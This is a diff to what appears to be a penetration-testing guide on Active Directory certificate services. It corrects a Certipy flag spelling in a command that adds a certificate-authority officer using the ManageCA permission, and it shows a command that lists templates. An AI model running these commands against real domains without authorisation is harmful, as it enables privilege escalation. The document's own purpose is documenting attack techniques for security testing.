@@ -184,7 +184,7 @@ If the attacker only has the `ManageCA` permission, [Certipy](https://github.com
 
 ```bash
 # Add a new officier
-certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -add-officier 'user'
+certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -add-officer 'user'
 
 # List all the templates
 certipy ca -u "$USER@$DOMAIN" -p "$PASSWORD" -dc-ip "$DC_IP" -ca 'ca_name' -list-templates
